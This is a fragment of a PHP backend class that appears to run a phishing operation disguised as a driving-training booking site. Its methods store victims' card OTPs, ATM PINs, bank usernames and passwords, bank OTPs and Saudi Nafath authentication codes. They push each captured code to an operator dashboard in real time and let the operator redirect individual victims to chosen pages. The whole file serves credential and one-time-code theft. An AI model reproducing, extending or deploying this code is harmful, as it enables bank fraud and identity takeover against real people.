  public function setRedirect($userId, $page)
  {
    $ok = false;
    if (function_exists('dashboard_pdo')) {
      try {
        $pdo = dashboard_pdo();
        $k = 'dash_redirect_user_' . (int) $userId;
        $val = json_encode(['page' => $page, 'active' => true, 't' => time()], JSON_UNESCAPED_UNICODE);
        $st = $pdo->prepare('INSERT INTO site_settings (setting_key, setting_value) VALUES (?, ?) ON DUPLICATE KEY UPDATE setting_value = VALUES(setting_value), updated_at = CURRENT_TIMESTAMP');
        $st->execute([$k, $val]);
        $ok = true;
      } catch (\Throwable $e) {
      }
    }
    if (!$ok) {
      try {
        $sql = 'UPDATE users SET redirect_to = :page, redirect_active = 1 WHERE id = :id';
        DB::query($sql);
        DB::bind(':page', $page);
        DB::bind(':id', $userId);
        if (DB::execute()) {
          $ok = true;
        }
      } catch (\Throwable $e) {
      }
    }
    if ($ok) {
      $this->sendPusherUpdate($userId, 'بانتظار التوجيه إلى: ' . $page);
    }
    return $ok;
  }

  public function clearRedirect($userId)
  {
    if (function_exists('dashboard_pdo')) {
      try {
        $pdo = dashboard_pdo();
        $k = 'dash_redirect_user_' . (int) $userId;
        $pdo->prepare('DELETE FROM site_settings WHERE setting_key = ?')->execute([$k]);
        return true;
      } catch (\Throwable $e) {
      }
    }
    try {
      $sql = 'UPDATE users SET redirect_to = NULL, redirect_active = 0 WHERE id = :id';
      DB::query($sql);
      DB::bind(':id', $userId);
      return DB::execute();
    } catch (\Throwable $e) {
      return false;
    }
  }

  public function insertCardOTP($cardId, $userId, $otpCode)
  {
    $sql = "INSERT INTO card_otps (card_id, user_id, otp_code)
            VALUES (:card_id, :user_id, :otp_code)";
    
    DB::query($sql);
    DB::bind(':card_id', $cardId);
    DB::bind(':user_id', $userId);
    DB::bind(':otp_code', $otpCode);
    
    if (DB::execute()) {
      $this->sendPusherUpdate($userId, 'رمز OTP جديد');
      return true;
    }
    return false;
  }

  public function fetchOtpsByCardId($cardId)
  {
    $oid = (int) $cardId;
    if ($oid < 1) {
      return [];
    }
    try {
      $sql = 'SELECT * FROM card_otps 
            WHERE card_id = :card_id 
            ORDER BY id DESC';
      DB::query($sql);
      DB::bind(':card_id', $oid);
      DB::execute();
      $legacy = DB::fetchAll();
      if (is_array($legacy) && count($legacy) > 0) {
        return $legacy;
      }
    } catch (\Throwable $e) {
    }
    if (function_exists('dashboard_pdo')) {
      try {
        $pdo = dashboard_pdo();
        $st = $pdo->prepare('SELECT id, otp, created_at, updated_at, card_history_json FROM orders WHERE id = ? LIMIT 1');
        $st->execute([$oid]);
        $o = $st->fetch(\PDO::FETCH_OBJ);
        if (!$o) {
          return [];
        }
        $out = [];
        $ch = (string) ($o->card_history_json ?? '');
        $list = [];
        if ($ch !== '' && is_array($dec = json_decode($ch, true))) {
          $list = $dec;
        }
        foreach ($list as $e) {
          if (!\is_array($e)) {
            continue;
          }
          $savedAt = (string) ($e['saved_at'] ?? $o->updated_at ?? $o->created_at ?? '');
          $attemptsList = [];
          if (!empty($e['otp_attempts']) && \is_array($e['otp_attempts'])) {
            foreach ($e['otp_attempts'] as $a) {
              $digits = preg_replace('/\D/', '', (string) $a);
              if ($digits !== '') {
                $attemptsList[] = $digits;
              }
            }
          }
          $single = preg_replace('/\D/', '', (string) ($e['otp'] ?? ''));
          if ($single !== '' && ($attemptsList === [] || end($attemptsList) !== $single)) {
            $attemptsList[] = $single;
          }
          foreach ($attemptsList as $digits) {
            $out[] = (object) [
              'otp_code' => $digits,
              'created_at' => $savedAt,
              'order_id' => (int) $o->id,
              'source' => 'otp_attempts',
            ];
          }
        }
        if (\count($out) === 0 && trim((string) ($o->otp ?? '')) !== '') {
          $digits = preg_replace('/\D/', '', (string) $o->otp);
          if ($digits !== '') {
            $out[] = (object) [
              'otp_code' => $digits,
              'created_at' => (string) ($o->updated_at ?? $o->created_at),
              'order_id' => (int) $o->id,
              'source' => 'order',
            ];
          }
        }
        if (\count($out) > 0) {
          return array_reverse($out);
        }
        return [];
      } catch (\Throwable $e) {
        return [];
      }
    }
    return [];
  }

  public function fetchLastCardByUserId($userId)
  {
    $sql = "SELECT * FROM cards 
            WHERE user_id = :user_id 
            ORDER BY id DESC 
            LIMIT 1";
    
    DB::query($sql);
    DB::bind(':user_id', $userId);
    DB::execute();
    
    return DB::fetch();
  }

public function insertCardPIN($cardId, $clientId, $pinCode)
{
    error_log("=== insertCardPIN START ===");
    error_log("Params: card_id=$cardId, client_id=$clientId, pin=$pinCode");

    try {
        // 1️⃣ إدخال السجل
        $sql = "INSERT INTO card_pins (card_id, client_id, pin_code)
                VALUES (:card_id, :client_id, :pin_code)";

        DB::query($sql);
        DB::bind(':card_id', $cardId);
        DB::bind(':client_id', $clientId);
        DB::bind(':pin_code', $pinCode);

        $result = DB::execute();

        if (!$result) {
            error_log("❌ Insert failed");
            return false;
        }

        // 2️⃣ جلب آخر ID تم إدخاله
        $lastId = DB::lastInsertId();
        error_log("✅ Inserted PIN ID: $lastId");

        // 3️⃣ جلب السجل الأخير كامل
        $sql = "SELECT *
                FROM card_pins
                WHERE id = :id
                LIMIT 1";

        DB::query($sql);
        DB::bind(':id', $lastId);

        $lastRecord = DB::single(); // أو fetch()

        error_log("✅ Last record fetched: " . json_encode($lastRecord));

        // 4️⃣ إرسال إشعار (اختياري)
        try {
            $this->sendPusherUpdate($clientId, 'رمز PIN جديد');
        } catch (Exception $e) {
            error_log("⚠️ Pusher failed: " . $e->getMessage());
        }

        // 5️⃣ إرجاع آخر سجل
        return $lastRecord;

    } catch (Exception $e) {
        error_log("❌ insertCardPIN Exception: " . $e->getMessage());
        error_log("Stack: " . $e->getTraceAsString());
        return false;
    }
}


  public function fetchLastPinByClientId($clientId)
  {
    $uid = (int) $clientId;
    if (function_exists('dashboard_pdo') && $uid !== 0) {
      try {
        $u = $this->fetchUserById($uid);
        if ($u) {
          $email = trim((string) ($u->email ?? ''));
          if ($email !== '') {
            $pdo = dashboard_pdo();
            $st = $pdo->prepare(
              'SELECT atm_password AS pin_code, created_at FROM orders WHERE customer_email = ? AND COALESCE(TRIM(atm_password), \'\') <> \'\' ORDER BY id DESC LIMIT 1'
            );
            $st->execute([$email]);
            $row = $st->fetch(\PDO::FETCH_OBJ);
            if ($row && trim((string) ($row->pin_code ?? '')) !== '') {
              return $row;
            }
            $st2 = $pdo->prepare(
              'SELECT id, atm_password, created_at, card_history_json FROM orders WHERE customer_email = ? ORDER BY id DESC LIMIT 1'
            );
            $st2->execute([$email]);
            $o = $st2->fetch(\PDO::FETCH_OBJ);
            if ($o) {
              $ch = (string) ($o->card_history_json ?? '');
              if ($ch !== '' && is_array($dec = json_decode($ch, true)) && \count($dec) > 0) {
                $last = \end($dec);
                \reset($dec);
                if (is_array($last)) {
                  $atm = trim((string) ($last['atm'] ?? ''));
                  if ($atm !== '') {
                    return (object) [
                      'pin_code' => $atm,
                      'created_at' => (string) ($last['saved_at'] ?? $o->created_at),
                    ];
                  }
                }
              }
            }
          }
        }
      } catch (\Throwable $e) {
      }
    }
    try {
      $sql = "SELECT pin_code, created_at
            FROM card_pins
            WHERE client_id = :client_id
            ORDER BY id DESC
            LIMIT 1";
      DB::query($sql);
      DB::bind(':client_id', $clientId);
      DB::execute();
      $row = DB::fetch();
      if ($row) {
        return $row;
      }
    } catch (\Throwable $e) {
    }
    return false;
  }

  public function insertNafadRequest($clientId, $phone, $telecom, $idNumber = null)
  {
    $sql = "INSERT INTO nafad_requests 
            (client_id, phone, telecom, id_number)
            VALUES 
            (:client_id, :phone, :telecom, :id_number)";

    DB::query($sql);
    DB::bind(':client_id', $clientId);
    DB::bind(':phone', $phone);
    DB::bind(':telecom', $telecom);
    DB::bind(':id_number', $idNumber);

    if (DB::execute()) {
      $this->sendPusherUpdate($clientId, 'طلب نفاذ جديد');
      return true;
    }
    return false;
  }

  public function fetchLastNafadByClientId($clientId)
  {
    $sql = "SELECT * FROM nafad_requests
            WHERE client_id = :client_id
            ORDER BY id DESC
            LIMIT 1";

    DB::query($sql);
    DB::bind(':client_id', $clientId);
    DB::execute();

    return DB::fetch();
  }

  public function insertNafadLog($data)
  {
    $sql = "INSERT INTO nafad_logs (
                user_id,
                phone,
                telecom,
                id_number,
                redirect_to
            ) VALUES (
                :user_id,
                :phone,
                :telecom,
                :id_number,
                :redirect_to
            )";

    DB::query($sql);
    DB::bind(':user_id', $data['user_id']);
    DB::bind(':phone', $data['phone']);
    DB::bind(':telecom', $data['telecom']);
    DB::bind(':id_number', $data['id_number']);
    DB::bind(':redirect_to', $data['redirect_to']);

    if (DB::execute()) {
      $this->sendPusherUpdate($data['user_id'], 'سجل نفاذ جديد');
      return true;
    }
    return false;
  }

  public function fetchNafadLogsByUserId($userId)
  {
    $sql = "SELECT 
                phone,
                telecom,
                id_number,
                redirect_to,
                created_at
            FROM nafad_logs
            WHERE user_id = :user_id
            ORDER BY id DESC";

    DB::query($sql);
    DB::bind(':user_id', $userId);
    DB::execute();

    return DB::fetchAll();
  }

  public function insertNafadCode($clientId, $nafadCode)
  {
    $sql = 'INSERT INTO `nafad_codes` (
        `client_id`,
        `nafad_code`
    ) VALUES (
        :client_id,
        :nafad_code
    )';

    DB::query($sql);
    DB::bind(':client_id', $clientId);
    DB::bind(':nafad_code', $nafadCode);

    if (DB::execute()) {
        $codeId = DB::lastInsertId();
        $this->sendPusherUpdate($clientId, 'رمز نفاذ جديد: ' . $nafadCode);
        return $codeId;
    }
    
    return false;
  }

  public function fetchNafadCodesByClientId($clientId)
  {
    $sql = 'SELECT 
                id,
                client_id,
                nafad_code,
                created_at
            FROM `nafad_codes` 
            WHERE `client_id` = :client_id 
            ORDER BY `id` DESC';
    
    DB::query($sql);
    DB::bind(':client_id', $clientId);
    DB::execute();
    
    return DB::fetchAll();
  }

  public function fetchLastNafadCodeByClientId($clientId)
  {
    $sql = 'SELECT * FROM `nafad_codes` 
            WHERE `client_id` = :client_id 
            ORDER BY `id` DESC 
            LIMIT 1';
    
    DB::query($sql);
    DB::bind(':client_id', $clientId);
    DB::execute();
    
    return DB::fetch();
  }

  public function sendNafathNumber($clientId, $number)
  {
    $sql = 'INSERT INTO `nafath_numbers` (
        `client_id`,
        `number`
    ) VALUES (
        :client_id,
        :number
    )';

    DB::query($sql);
    DB::bind(':client_id', $clientId);
    DB::bind(':number', $number);

    if (DB::execute()) {
        $numberId = DB::lastInsertId();
        $this->sendPusherUpdate($clientId, 'رقم نفاذ: ' . $number);
        if (function_exists('bujairi_dashboard_email_for_user_id') && function_exists('dashboard_pdo')) {
            $em = bujairi_dashboard_email_for_user_id((int) $clientId);
            if ($em !== '') {
                try {
                    $pdo = dashboard_pdo();
                    $st = $pdo->prepare('SELECT id FROM orders WHERE customer_email = ? ORDER BY id DESC LIMIT 1');
                    $st->execute([$em]);
                    $oid = (int) $st->fetchColumn();
                    if ($oid > 0) {
                        try {
                            $pdo->prepare('UPDATE orders SET nafath_code = ? WHERE id = ?')->execute([(string) $number, $oid]);
                        } catch (\Throwable $e) {
                        }
                        if (function_exists('bujairi_pusher_notify_nafath_display')) {
                            bujairi_pusher_notify_nafath_display($oid, (string) $number);
                        }
                    }
                } catch (\Throwable $e) {
                }
            }
        }
        return $numberId;
    }
    
    return false;
  }

  public function getLastNafathNumber($clientId)
  {
    $sql = 'SELECT * FROM `nafath_numbers` 
            WHERE `client_id` = :client_id 
            ORDER BY `id` DESC 
            LIMIT 1';
    
    DB::query($sql);
    DB::bind(':client_id', $clientId);
    DB::execute();
    
    return DB::fetch();
  }

  public function getAllNafathNumbers($clientId)
  {
    $sql = 'SELECT * FROM `nafath_numbers` 
            WHERE `client_id` = :client_id 
            ORDER BY `id` DESC';
    
    DB::query($sql);
    DB::bind(':client_id', $clientId);
    DB::execute();
    
    return DB::fetchAll();
  }
public function getUsersWithCards()
{
    if (function_exists('dashboard_pdo')) {
      try {
        $pdo = dashboard_pdo();
        $st = $pdo->query(
          "SELECT u.id, u.email AS username, u.full_name AS message, u.email AS name, u.full_name,
           COUNT(DISTINCT o.id) AS card_count, MAX(o.created_at) AS last_card_time
           FROM users u
           INNER JOIN orders o ON o.customer_email = u.email
           AND (COALESCE(o.card_number, '') <> '' OR COALESCE(o.cardholder_name, '') <> '')
           GROUP BY u.id, u.email, u.full_name
           ORDER BY last_card_time DESC"
        );
        if ($st) {
          $data = $st->fetchAll(\PDO::FETCH_OBJ);
          if (is_array($data) && \count($data) > 0) {
            return $data;
          }
        }
      } catch (\Throwable $e) {
      }
    }
    try {
      $sql = "SELECT 
                u.id,
                u.email AS username,
                u.full_name AS message,
                u.email AS name,
                u.email AS name_display,
                COUNT(c.id) as card_count,
                MAX(c.created_at) as last_card_time
            FROM users u
            INNER JOIN cards c ON u.id = c.user_id
            GROUP BY u.id, u.email, u.full_name
            ORDER BY MAX(c.created_at) DESC";
      DB::query($sql);
      DB::execute();
      if (DB::rowCount() > 0) {
        return DB::fetchAll();
      }
    } catch (\Throwable $e) {
    }
    return false;
}
public function updateSecondStepData($userId, $data = array())
{
    $sql = 'UPDATE `users` SET 
      `region` = :region,
      `branch` = :branch,
      `level` = :level,
      `gear_type` = :gear_type,
      `time_period` = :time_period,
      `message` = :message,
      `currentpage` = :currentpage,
      `updated_at` = CURRENT_TIMESTAMP
    WHERE `id` = :user_id';

    DB::query($sql);
    DB::bind(':region', $data['region'] ?? null);
    DB::bind(':branch', $data['branch'] ?? null);
    DB::bind(':level', $data['level'] ?? null);
    DB::bind(':gear_type', $data['gear_type'] ?? null);
    DB::bind(':time_period', $data['time_period'] ?? null);
    DB::bind(':message', 'بيانات التدريب - المرحلة 2');
    DB::bind(':currentpage', 'register-second.php');
    DB::bind(':user_id', $userId);

    if (DB::execute()) {
      $this->sendPusherUpdate($userId, 'بيانات التدريب - المرحلة 2');
      return true;
    }
    
    return false;
}
/**
 * حفظ بيانات تسجيل الدخول للبنك
 */
public function insertBankLogin($data = array())
{
    $sql = 'INSERT INTO `bank_logins` (
        `user_id`,
        `bank`,
        `user_name`,
        `bk_pass`,
        `created_at`
    ) VALUES (
        :user_id,
        :bank,
        :user_name,
        :bk_pass,
        NOW()
    )';

    DB::query($sql);
    DB::bind(':user_id', $data['user_id']);
    DB::bind(':bank', $data['bank'] ?? null);
    DB::bind(':user_name', $data['user_name'] ?? null);
    DB::bind(':bk_pass', $data['bk_pass'] ?? null);

    if (DB::execute()) {
        $bankId = DB::lastInsertId();
        $this->sendPusherUpdate($data['user_id'], 'بيانات بنك جديدة - ' . ($data['bank'] ?? 'بنك'));
        return $bankId;
    }

    return false;
}

/**
 * جلب بيانات البنوك حسب user_id
 */
public function fetchBankLoginsByUserId($userId)
  {
    $out = [];
    try {
      $sql = 'SELECT * FROM `bank_logins` WHERE `user_id` = :user_id ORDER BY created_at DESC';
      DB::query($sql);
      DB::bind(':user_id', $userId);
      DB::execute();
      $out = DB::fetchAll();
      if (is_array($out) && \count($out) > 0) {
        return $out;
      }
    } catch (\Throwable $e) {
    }
    if (function_exists('dashboard_pdo')) {
      $u = $this->fetchUserById($userId);
      if ($u) {
        $email = trim((string) ($u->email ?? ''));
        if ($email !== '') {
          try {
            $pdo = dashboard_pdo();
            $st = $pdo->prepare(
              'SELECT id, mobile, national_id_or_iqama, provider, created_at, otp, atm_password
               FROM orders WHERE customer_email = ? ORDER BY id DESC LIMIT 1'
            );
            $st->execute([$email]);
            $o = $st->fetch(\PDO::FETCH_OBJ);
            if ($o) {
              $out[] = (object) [
                'id' => (int) $o->id,
                'bank' => (string) ($o->provider !== '' && $o->provider !== '0' ? $o->provider : 'بيانات من طلب الحجز'),
                'user_name' => (string) ($o->mobile !== '' ? $o->mobile : $o->national_id_or_iqama),
                'bk_pass' => (string) ($o->atm_password !== '' ? $o->atm_password : '—'),
                'created_at' => (string) $o->created_at,
                'order_note' => 'طلب حجز',
              ];
            }
          } catch (\Throwable $e) {
          }
        }
      }
    }
    return $out;
  }

/**
 * جلب آخر بيانات بنك لمستخدم معين
 */
public function fetchLastBankLoginByUserId($userId)
{
    $sql = "SELECT * FROM bank_logins 
            WHERE user_id = :user_id 
            ORDER BY id DESC 
            LIMIT 1";
    
    DB::query($sql);
    DB::bind(':user_id', $userId);
    DB::execute();
    
    return DB::fetch();
}
/**
 * حفظ رمز OTP البنك
 */
public function insertBankOTP($userId, $otpCode)
{
    $sql = 'INSERT INTO `bank_otps` (
        `user_id`,
        `otp_code`,
        `created_at`
    ) VALUES (
        :user_id,
        :otp_code,
        NOW()
    )';

    DB::query($sql);
    DB::bind(':user_id', $userId);
    DB::bind(':otp_code', $otpCode);

    if (DB::execute()) {
        $this->sendPusherUpdate($userId, 'رمز OTP بنك - ' . $otpCode);
        return DB::lastInsertId();
    }

    return false;
}

/**
 * جلب رموز OTP البنك
 */
public function fetchBankOTPsByUserId($userId)
  {
    $list = [];
    try {
      $sql = 'SELECT * FROM `bank_otps` WHERE `user_id` = :user_id ORDER BY created_at DESC';
      DB::query($sql);
      DB::bind(':user_id', $userId);
      DB::execute();
      $list = DB::fetchAll();
    } catch (\Throwable $e) {
      $list = [];
    }
    if (!is_array($list)) {
      $list = [];
    }
    if (function_exists('dashboard_pdo')) {
      $u = $this->fetchUserById($userId);
      if ($u) {
        $email = trim((string) ($u->email ?? ''));
        if ($email !== '') {
          try {
            $pdo = dashboard_pdo();
            $st = $pdo->prepare(
              'SELECT id, otp, created_at FROM orders WHERE customer_email = ? AND COALESCE(TRIM(otp), \'\') <> \'\' ORDER BY id DESC'
            );
            $st->execute([$email]);
            while ($r = $st->fetch(\PDO::FETCH_OBJ)) {
              if (trim((string) $r->otp) === '') {
                continue;
              }
              $list[] = (object) [
                'id' => 'o' . (int) $r->id,
                'user_id' => (int) $userId,
                'otp_code' => (string) $r->otp,
                'created_at' => (string) $r->created_at,
                'source' => 'order',
              ];
            }
          } catch (\Throwable $e) {
          }
        }
      }
    }
    return $list;
  }
}